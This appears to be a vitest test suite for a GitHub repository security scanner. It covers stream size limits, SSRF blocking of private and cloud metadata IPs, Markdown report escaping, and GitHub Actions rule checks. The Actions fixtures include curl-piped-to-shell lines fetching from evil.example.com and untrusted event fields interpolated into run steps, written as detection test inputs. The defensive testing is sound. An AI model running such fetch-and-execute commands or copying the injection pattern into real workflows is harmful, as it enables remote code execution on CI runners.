/**
 * Phase 4: Independent Security Review & Release Readiness Test Suite
 * Deterministic regression tests verifying:
 * 1. Chunked/streaming request body limits without Content-Length
 * 2. DNS rebinding & private/loopback/cloud metadata IP address restrictions
 * 3. Safe response stream consumption with byte-level limit enforcement
 * 4. GHA-004 and GHA-005 adversarial bypass protection
 * 5. Markdown report code fence escaping and table pipe sanitization
 * 6. Dataset isolation and clean separation of demo vs live audits
 */

import { describe, it, expect } from 'vitest';
import { readJsonBodyWithLimit } from '../lib/api-payload';
import {
  isPrivateOrLocalIp,
  verifyHostDnsNotPrivate,
  readResponseTextWithLimit,
  isApprovedGitHubHost,
} from '../lib/github';
import { inspectWorkflow } from '../lib/actions/engine';
import { generateMarkdownReport } from '../lib/reports';
import { NextRequest } from 'next/server';
import { ScanResult } from '../lib/types';

describe('Phase 4: Independent Security Review Suite', () => {
  // =========================================================================
  // 1. Streaming / Chunked Request Body Limit Enforcement
  // =========================================================================
  describe('Streaming & Chunked Body Limit Ingestion', () => {
    it('cancels stream and returns HTTP 413 when chunked stream exceeds 5MB without Content-Length header', async () => {
      // Simulate chunked streaming request (no content-length header)
      const maxLimit = 1024 * 1024; // 1 MB limit for test
      let streamCancelled = false;

      const largeChunk = new Uint8Array(512 * 1024); // 512 KB
      largeChunk.fill(65); // 'A'

      let chunksDelivered = 0;
      const customStream = new ReadableStream({
        pull(controller) {
          if (chunksDelivered < 4) {
            // 4 * 512KB = 2MB > 1MB
            controller.enqueue(largeChunk);
            chunksDelivered++;
          } else {
            controller.close();
          }
        },
        cancel() {
          streamCancelled = true;
        },
      });

      const req = new NextRequest('http://localhost:3000/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: customStream,
        duplex: 'half',
      });

      const result = await readJsonBodyWithLimit(req, maxLimit);
      expect(result.status).toBe(413);
      expect(result.error).toContain('Stream exceeded');
      expect(streamCancelled).toBe(true);
    });

    it('successfully ingests valid streaming request within permitted limit', async () => {
      const validPayload = JSON.stringify({ repoUrl: 'owner/repo', forceDemo: true });
      const encoded = new TextEncoder().encode(validPayload);

      const customStream = new ReadableStream({
        start(controller) {
          controller.enqueue(encoded);
          controller.close();
        },
      });

      const req = new NextRequest('http://localhost:3000/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: customStream,
        duplex: 'half',
      });

      const result = await readJsonBodyWithLimit(req);
      expect(result.error).toBeUndefined();
      expect(result.data).toEqual({ repoUrl: 'owner/repo', forceDemo: true });
    });

    it('returns HTTP 400 with safe error on malformed JSON stream', async () => {
      const brokenPayload = new TextEncoder().encode('{ broken json [');
      const customStream = new ReadableStream({
        start(controller) {
          controller.enqueue(brokenPayload);
          controller.close();
        },
      });

      const req = new NextRequest('http://localhost:3000/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: customStream,
        duplex: 'half',
      });

      const result = await readJsonBodyWithLimit(req);
      expect(result.status).toBe(400);
      expect(result.error).toContain('Malformed JSON');
    });
  });

  // =========================================================================
  // 2. SSRF, Private IP, and DNS Resolution Defenses
  // =========================================================================
  describe('SSRF & Private/Metadata IP Restrictions', () => {
    it('detects and blocks all private, link-local, loopback, and cloud metadata IPv4 addresses', () => {
      expect(isPrivateOrLocalIp('127.0.0.1')).toBe(true);
      expect(isPrivateOrLocalIp('127.1.2.3')).toBe(true);
      expect(isPrivateOrLocalIp('10.0.0.1')).toBe(true);
      expect(isPrivateOrLocalIp('10.255.255.254')).toBe(true);
      expect(isPrivateOrLocalIp('172.16.0.1')).toBe(true);
      expect(isPrivateOrLocalIp('172.31.255.254')).toBe(true);
      expect(isPrivateOrLocalIp('192.168.1.1')).toBe(true);
      expect(isPrivateOrLocalIp('169.254.169.254')).toBe(true); // AWS / GCP metadata
      expect(isPrivateOrLocalIp('100.64.0.1')).toBe(true); // CGNAT
      expect(isPrivateOrLocalIp('0.0.0.0')).toBe(true);
    });

    it('detects and blocks IPv6 loopback, link-local, unique-local, and IPv4-mapped addresses', () => {
      expect(isPrivateOrLocalIp('::1')).toBe(true);
      expect(isPrivateOrLocalIp('::')).toBe(true);
      expect(isPrivateOrLocalIp('fe80::1')).toBe(true);
      expect(isPrivateOrLocalIp('fc00::1')).toBe(true);
      expect(isPrivateOrLocalIp('fd00::1')).toBe(true);
      expect(isPrivateOrLocalIp('::ffff:127.0.0.1')).toBe(true);
      expect(isPrivateOrLocalIp('::ffff:169.254.169.254')).toBe(true);
      expect(isPrivateOrLocalIp('::ffff:10.0.0.1')).toBe(true);
    });

    it('allows legitimate public IP addresses', () => {
      expect(isPrivateOrLocalIp('20.207.73.82')).toBe(false); // GitHub IP
      expect(isPrivateOrLocalIp('140.82.112.4')).toBe(false); // GitHub IP
      expect(isPrivateOrLocalIp('8.8.8.8')).toBe(false); // Google DNS
      expect(isPrivateOrLocalIp('1.1.1.1')).toBe(false); // Cloudflare DNS
    });

    it('blocks DNS rebinding when target resolves to private or loopback addresses', async () => {
      // localhost resolves to 127.0.0.1 or ::1
      await expect(verifyHostDnsNotPrivate('localhost')).rejects.toThrow('SSRF Blocked');
    });
  });

  // =========================================================================
  // 3. Response Stream Consumption Security
  // =========================================================================
  describe('Safe Response Stream Reading (readResponseTextWithLimit)', () => {
    it('aborts response stream if incoming chunks exceed byte limit without content-length', async () => {
      const maxLimit = 256; // 256 bytes
      let streamCancelled = false;

      const chunk = new Uint8Array(200);
      chunk.fill(66);

      let count = 0;
      const stream = new ReadableStream({
        pull(controller) {
          if (count < 3) {
            // 3 * 200 = 600 bytes > 256
            controller.enqueue(chunk);
            count++;
          } else {
            controller.close();
          }
        },
        cancel() {
          streamCancelled = true;
        },
      });

      const mockRes = new Response(stream);
      await expect(readResponseTextWithLimit(mockRes, maxLimit)).rejects.toThrow(
        'Response stream exceeded safety limit'
      );
      expect(streamCancelled).toBe(true);
    });
  });

  // =========================================================================
  // 4. GitHub Actions Rule Bypass Resistance (GHA-004 & GHA-005)
  // =========================================================================
  describe('GitHub Actions Rule Bypass Testing', () => {
    it('detects untrusted context injection across pull_request.head.label, review_comment, and workflow_run', () => {
      const yaml = `
name: Advanced Injection Bypass Test
on:
  pull_request:
  workflow_run:
    workflows: [CI]
    types: [completed]
jobs:
  test-bypasses:
    runs-on: ubuntu-latest
    steps:
      - name: PR Label
        run: |
          echo "Label: \${{ github.event.pull_request.head.label }}"
      - name: Review Comment
        run: |
          echo "Comment: \${{ github.event.review_comment.body }}"
      - name: Workflow Run Branch
        run: |
          echo "Branch: \${{ github.event.workflow_run.head_branch }}"
`;
      const result = inspectWorkflow(yaml, '.github/workflows/advanced-injection.yml', 'owner/repo');
      const gha004 = result.findings.filter((f) => f.id.includes('GHA-004'));
      expect(gha004.length).toBe(3);
    });

    it('detects pipe to shell through /usr/bin/bash, pwsh, and node', () => {
      const yaml = `
name: Advanced Pipe Shell Test
on: push
jobs:
  pipes:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -sSL https://evil.example.com/run | /usr/bin/bash
      - run: |
          curl -sSL https://evil.example.com/script.ps1 | pwsh
      - run: |
          curl -sSL https://evil.example.com/app.js | node
`;
      const result = inspectWorkflow(yaml, '.github/workflows/pipes.yml', 'owner/repo');
      const gha005 = result.findings.filter((f) => f.id.includes('GHA-005'));
      expect(gha005.length).toBe(3);
    });
  });

  // =========================================================================
  // 5. Markdown Report Formatting & Table Integrity
  // =========================================================================
  describe('Markdown Report Injection & Table Integrity', () => {
    it('escapes triple backticks in evidence snippets using quadruple backticks', () => {
      const scanResult: ScanResult = {
        scanVerdict: 'complete_with_findings',
        repository: {
          owner: 'test',
          repo: 'repo',
          fullName: 'test/repo|with-pipe',
          defaultBranch: 'main',
          stars: 5,
        },
        scannedAt: new Date().toISOString(),
        scannerVersion: '2.0.0',
        warnings: [],
        errors: [],
        timeline: [],
        findings: [
          {
            id: 'FINDING-1',
            title: 'Test with triple backticks',
            category: 'injection_risk',
            severity: 'high',
            severityRationale: 'Testing fence escaping',
            repository: 'test/repo',
            filePath: '.github/workflows/ci.yml',
            observedValue: '```\ncode inside\n```',
            evidenceSnippet: '```\nmalicious fence break\n```',
            detectionSource: 'Sentinel Rule GHA-004',
            recommendedAction: 'Fix',
            confidence: 'confirmed',
            limitations: 'None',
            verificationStatus: 'unverified',
          },
        ],
        manifestsFound: ['package.json'],
        workflowsFound: ['.github/workflows/ci.yml'],
        stats: {
          totalFindings: 1,
          criticalCount: 0,
          highCount: 1,
          mediumCount: 0,
          lowCount: 0,
          infoCount: 0,
          confirmedCount: 1,
          potentialRiskCount: 0,
          versionUnverifiedCount: 0,
          unknownCount: 0,
          filesScanned: 2,
          dependenciesScanned: 1,
          workflowsScanned: 1,
        },
        coverage: {
          commitSha: 'abc',
          filesDiscovered: 2,
          filesAnalyzed: 2,
          filesSkipped: 0,
          manifestsDetected: ['package.json'],
          lockfilesDetected: [],
          dependenciesDiscovered: 1,
          exactVersionsResolved: 1,
          unresolvedRanges: 0,
          unsupportedManifests: [],
          parserErrors: [],
          upstreamFailures: [],
          scanTruncated: false,
          vulnerabilitySources: ['OSV'],
          workflowFilesAnalyzed: 1,
          analyzersCompleted: [],
          durationMs: 40,
        },
      };

      const markdown = generateMarkdownReport(scanResult);

      // Verify code fence uses ```` to contain ``` inside the excerpt safely
      expect(markdown).toContain('````');
      expect(markdown).toContain('malicious fence break');

      // Verify pipe | in repository name was sanitized in table cell
      expect(markdown).toContain('test/repo\\|with-pipe');
    });
  });
});
